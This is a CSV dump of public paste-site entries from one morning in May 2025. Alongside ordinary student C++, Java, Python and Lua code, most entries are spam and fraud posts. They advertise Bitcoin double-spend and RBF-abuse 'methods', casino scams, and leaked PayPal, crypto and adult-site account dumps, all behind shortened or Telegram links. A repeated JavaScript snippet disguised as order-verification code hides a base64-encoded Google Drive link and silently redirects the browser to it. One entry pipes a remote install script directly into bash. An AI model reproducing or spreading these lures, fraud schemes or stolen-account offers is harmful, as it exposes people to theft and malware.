id,title,username,language,date,content
1bVVgi1E,Abuse RBF in BTC transactions,WassupDog45,JavaScript,Sunday 4th of May 2025 06:35:40 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 01494
DTRRCHUM,Make $1000 15-MINUTES  (BEGINNER) YR,MEDI_YOUTUBE,JavaScript,Sunday 4th of May 2025 06:35:37 AM CDT," 
Pdf https://tinyurl.com/freshleaks

YFRBX5PzkG
"
65uGZzBT,Market.js,navrajkhunger,JavaScript,Sunday 4th of May 2025 06:35:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13758/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u9vxNEA5,Crypto Accounts,luqlegal,JavaScript,Sunday 4th of May 2025 06:34:37 AM CDT,68478 Accounts Posted On https://t.me/leakzbyeminem
zMPYenBS,Untitled,Realratnadwip,Java,Sunday 4th of May 2025 06:34:04 AM CDT,"import java.util.Scanner;

public class Test 
{
  public static void main(String[] args)
  {
    Scanner in = new Scanner(System.in);
    double num1, num2, num3, max;
    
    
    System.out.println(""Enter 1st Number: "");
    num1 = in.nextFloat();
    System.out.println(""Enter 2nd Number: "");
    num2 = in.nextFloat();
    System.out.println(""Enter 3rd Number: "");
    num3 = in.nextFloat();

    if (num1 == num2 && num2 == num3)
    {
      System.out.println(""All Numbers are the same: "" + num1);
    }
    else
    {
      max = num1;
      if (num2 > max)
      {
        max = num2;
      }
      if (num3 > max)
      {
        max = num3;
      }

          System.out.println(""Biggest Number: "" + max);
      }
  }
}"
3ZShrDGw,EARN $900 INSTANTLY 2025 95,MEDI_YOUTUBE,JavaScript,Sunday 4th of May 2025 06:26:24 AM CDT," 
Pdf https://tinyurl.com/freshleaks

iWh6fmFekd
"
qWeB6WmW,Soundness CLI,EvenoR,Bash,Sunday 4th of May 2025 06:21:37 AM CDT,"#1. Update system & Install Curl
sudo apt update
sudo apt install curl
#2. Install installation script
curl -sSL https://raw.githubusercontent.com/soundnesslabs/soundness-layer/main/soundnessup/install | bash
#3. Install node 
source ~/.bashrc
soundnessup install
#4. Get keys
soundness-cli generate-key --name ИМЯ_КЛЮЧА
#5. Update node
soundnessup update"
awFLiydM,Stake Free Balance Method,WassupDog45,JavaScript,Sunday 4th of May 2025 06:20:18 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 20432
i6M8BaLG,Untitled,navrajkhunger,JavaScript,Sunday 4th of May 2025 06:19:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42796/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7i2X8XrV,PayPal with Balance,luqlegal,JavaScript,Sunday 4th of May 2025 06:19:14 AM CDT,88572 Accounts Posted On https://t.me/leakzbyeminem
Q8pECxf1,Make $1000 15-MINUTES (BEGINNER) L4,MEDI_YOUTUBE,JavaScript,Sunday 4th of May 2025 06:17:10 AM CDT," 
Pdf https://tinyurl.com/freshleaks

4lpRx3tSqc
"
zH4VViLJ,Scam Casinos and Stores,WassupDog45,JavaScript,Sunday 4th of May 2025 06:04:57 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 99811
ibmnyEZy,Products.js,navrajkhunger,JavaScript,Sunday 4th of May 2025 06:04:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00242/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cxLC0PfY,Leaked Accounts - Fresh Hits,luqlegal,JavaScript,Sunday 4th of May 2025 06:03:50 AM CDT,99215 Accounts Posted On https://t.me/leakzbyeminem
RysCfKaD,Midway Dialing Program V3,oswald_the_void,Lua,Sunday 4th of May 2025 06:01:53 AM CDT,"-- Midway Relay Program (Event-Driven Version)
-- For Stargate Journey + ComputerCraft Tweaked
-- Supports a 2x2 monitor and two crystal interfaces (Milky Way & Pegasus)

local gate_1 = peripheral.wrap(""crystal_interface_27"") -- Milky Way
local gate_2 = peripheral.wrap(""crystal_interface_26"") -- Pegasus
local monitor = peripheral.find(""monitor"") -- Assumes 2x2 monitor

local lantea_address = {29, 5, 17, 34, 6, 12, 0} --modify if needed
local return_address = {27, 25, 4, 35, 10, 28, 0} --you can set it to an 8th chevron address for specific dialing

local timeout_timer = nil
local awaiting_confirmation = false
local active_gate = nil
local status = ""Idle""

-- === Monitor UI ===
local function center(text, y)
    local w, _ = monitor.getSize()
    local x = math.floor((w - #text) / 2) + 1
    monitor.setCursorPos(x, y)
    monitor.write(text)
end

local function drawScreen()
    monitor.setBackgroundColor(colors.black)
    monitor.clear()
    monitor.setTextColor(colors.lime)
    center(""Midway Relay Active"", 1)
    monitor.setTextColor(colors.white)
    center(""Status: "" .. status, 2)

    if awaiting_confirmation then
        monitor.setCursorPos(6, 4)
        monitor.setBackgroundColor(colors.gray)
        monitor.setTextColor(colors.black)
        monitor.write("" CONFIRM "")
    end
    monitor.setBackgroundColor(colors.black)
end

local function waitForConfirmation()
    awaiting_confirmation = true
    drawScreen()

    while true do
        local event, side, x, y = os.pullEvent(""monitor_touch"")
        if x >= 6 and x <= 13 and y == 4 then
            awaiting_confirmation = false
            drawScreen()
            return true
        end
    end
end

-- === Dial Logic ===
local function dialAddress(gate, address)
    if not gate then return false end
    for _, symbol in ipairs(address) do
        local ok, err = pcall(function() gate.engageSymbol(symbol) end)
        if not ok then
            print(""Dial error at symbol:"", symbol, ""->"", err)
            return false
        end
        os.sleep(0.5)
    end
    return true
end

-- === Event Loop ===
print(""Midway Event Relay Started"")
drawScreen()

while true do
    local event, param1, param2 = os.pullEvent()

    if event == ""sgJourney_incoming_wormhole"" then
        local iface = param1
        print(""Incoming wormhole on:"", iface)

        if iface == ""crystal_interface_27"" then
            status = ""Incoming Gate 1""
            drawScreen()
            active_gate = gate_2

            if waitForConfirmation() then
                status = ""Dialing Lantea""
                drawScreen()
                dialAddress(gate_2, lantea_address)
                timeout_timer = os.startTimer(20)
            end

        elseif iface == ""crystal_interface_26"" then
            status = ""Incoming Gate 2""
            drawScreen()
            active_gate = gate_1

            if waitForConfirmation() then
                status = ""Dialing Return""
                drawScreen()
                dialAddress(gate_1, return_address)
            end
        end

    elseif event == ""sgJourney_gate_closed"" then
        local iface = param1
        print(""Gate closed:"", iface)
        status = ""Idle""
        drawScreen()

    elseif event == ""timer"" and param1 == timeout_timer then
        print(""Timeout reached: closing Pegasus gate"")
        if gate_2 then gate_2.disconnect() end
        status = ""Pegasus Timed Out""
        timeout_timer = nil
        drawScreen()
    end
end"
w7dDrJVQ,dataNone,TestGuy1,JSON,Sunday 4th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'ef928726b3e6cea3fa7b979f17bf7c5b6a49cf2fa9dce6c7b594dd94b9095fa8a12d1c7733356781b7bae0a075c17f1f121b660865eca04117c5c66caea5b5f8b850f54c9821c5bd71b76f6d7e83dd003cc9713c1acd6700e41482ce058c91107acc8f7b246d958be8c6b056b6aa33c6a32b7a25418589e402afd6cb026c23c7',
  otherdata: [
    '059a5f575230f2909ff426ecae1c0947',
    'c6ad38b91a12c4b25122acdab27cb1a6',
    'a863400b7510d9eac9397adb13c8441a',
    '117639857ca247239a1ca787efbc265b',
    'bf4a08d4d75420b896911649b31e1a98',
    '683a78b32fd12e88a6f664a6cd54fec0',
    '5b7eefa9ff85a00564ebaf0ef691f1e5',
    'c3abccf25449f3dfebb2a4156bfdb1e0'
  ]
}"
TArhVuyG,Untitled,Josif_tepe,C++,Sunday 4th of May 2025 05:59:17 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;


int main() {
    int n;
    cin >> n;
    
    vector<int> v;
    for(int i = 0; i < n; i++) {
        int x;
        cin >> x;
        v.push_back(x);
    }
    
    sort(v.begin(), v.end());
    int x;
    cin >> x;
    
    int idx = lower_bound(v.begin(), v.end(), x) - v.begin();
    if(idx >= 0 and idx < v.size()) {
        cout << v[idx] << endl;
    }
    else {
        cout <<""VAKOV ELEMENT NE POSTOI"" << endl;
    }
    
    return 0;
}
"
tJP1hQEh,Untitled,Josif_tepe,C++,Sunday 4th of May 2025 05:50:08 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;


int main() {
    int n;
    cin >> n;
    
    vector<int> v;
    for(int i = 0; i < n; i++) {
        int x;
        cin >> x;
        v.push_back(x);
    }
    
    for(int i =0 ; i < v.size(); i++) {
        cout << v[i] << "" "";
    }
    cout << endl;
    
    v.erase(v.begin() + 1);
    
    for(int i =0 ; i < v.size(); i++) {
        cout << v[i] << "" "";
    }
    
    
    return 0;
}
"
1ath5Z7k,Doublespending using Vanity Wallet,WassupDog45,JavaScript,Sunday 4th of May 2025 05:49:35 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 81929
bGu8rCNB,Order.js,navrajkhunger,JavaScript,Sunday 4th of May 2025 05:48:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70742/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qhCv1tqr,Chaturbate with Tokens,luqlegal,JavaScript,Sunday 4th of May 2025 05:48:28 AM CDT,49641 Accounts Posted On https://t.me/leakzbyeminem
jpk1En6r,Untitled,Josif_tepe,C++,Sunday 4th of May 2025 05:39:06 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;


int main() {
    int n;
    cin >> n;
    
    vector<int> v;
    for(int i = 0; i < n; i++) {
        int x;
        cin >> x;
        
        v.push_back(x);
    }
    sort(v.rbegin(), v.rend());
    
    for(int i = 0; i < v.size(); i++) {
        cout << v[i] << "" "";
    }
    
    
    return 0;
}
"
FV4sGpan,Untitled,Josif_tepe,C++,Sunday 4th of May 2025 05:35:44 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;


int main() {
    int n;
    cin >> n;
    
    vector<int> v;
    for(int i = 0; i < n; i++) {
        int x;
        cin >> x;
        
        v.push_back(x);
    }
    sort(v.begin(), v.end());
    
    for(int i = 0; i < v.size(); i++) {
        cout << v[i] << "" "";
    }
    
    
    return 0;
}
"
Xk4SvLAx,Abuse RBF in BTC transactions,WassupDog45,JavaScript,Sunday 4th of May 2025 05:34:12 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 50991
iZE8DcSe,Market.js,navrajkhunger,JavaScript,Sunday 4th of May 2025 05:33:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28940/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N7g4Fu6c,Crypto Accounts,luqlegal,JavaScript,Sunday 4th of May 2025 05:33:06 AM CDT,73354 Accounts Posted On https://t.me/leakzbyeminem
yX5428zS,Stake Free Balance Method,WassupDog45,JavaScript,Sunday 4th of May 2025 05:18:50 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 02594
4DFY4vM8,Untitled,navrajkhunger,JavaScript,Sunday 4th of May 2025 05:18:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52304/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iifmA4DE,PayPal with Balance,luqlegal,JavaScript,Sunday 4th of May 2025 05:17:45 AM CDT,42173 Accounts Posted On https://t.me/leakzbyeminem
5GJNzyAv,Untitled,Josif_tepe,C++,Sunday 4th of May 2025 05:16:16 AM CDT,"#include <iostream>
#include <vector>
using namespace std;


int main() {
    int n;
    cin >> n;
    
    vector<int> v;
    for(int i = 0; i < n; i++) {
        int x;
        cin >> x;
        
        v.push_back(x);
    }
    
    for(int i = 0; i < v.size(); i++) {
        cout << v[i] << "" "";
    }
    
    return 0;
}
"
fPZ7fdDL,Scam Casinos and Stores,WassupDog45,JavaScript,Sunday 4th of May 2025 05:03:29 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 17798
Bjire2q3,Products.js,navrajkhunger,JavaScript,Sunday 4th of May 2025 05:02:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35369/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AamLCSzE,Leaked Accounts - Fresh Hits,luqlegal,JavaScript,Sunday 4th of May 2025 05:02:24 AM CDT,51235 Accounts Posted On https://t.me/leakzbyeminem
7f08ed8t,Doublespending using Vanity Wallet,WassupDog45,JavaScript,Sunday 4th of May 2025 04:48:07 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 26358
0cYXuUKN,Order.js,navrajkhunger,JavaScript,Sunday 4th of May 2025 04:47:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83012/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jiUFuUtj,Chaturbate with Tokens,luqlegal,JavaScript,Sunday 4th of May 2025 04:47:02 AM CDT,39739 Accounts Posted On https://t.me/leakzbyeminem
JdCG879d,26 найти лидера продаж,nq1s788,Python,Sunday 4th of May 2025 04:37:05 AM CDT,"#26 https://kpolyakov.spb.ru/school/ege/gen.php?action=viewVar&answers=on&varId=3
data = open('26.txt').readlines()
n = int(data[0])
a = []
sr = 0
for e in data[1:]:
    x, y, z = map(int, e.split())
    y += sr
    a.append((x,y,z))
sr = sr // len(a)
dr = []
for i in range(len(a)):
    if a[i][1] > sr:
        dr.append(a[i])
ost = {}
prod = {}
for e in dr:
    if e[0] not in ost:
        ost[e[0]] = 0
        prod[e[0]] = 0
    ost[e[0]] += e[2]
    prod[e[0]] += e[2] ^ 1
all_lid = (0, 0, 0) #prod, cost, -ost
art = -1
for e in dr:
    if (prod[e[0]], e[1], -ost[e[0]]) > all_lid:
        all_lid = (prod[e[0]], e[1], -ost[e[0]])
        art = e[0]
print(-all_lid[2] * all_lid[1], art)"
W17Vcuas,Abuse RBF in BTC transactions,WassupDog45,JavaScript,Sunday 4th of May 2025 04:32:43 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 78046
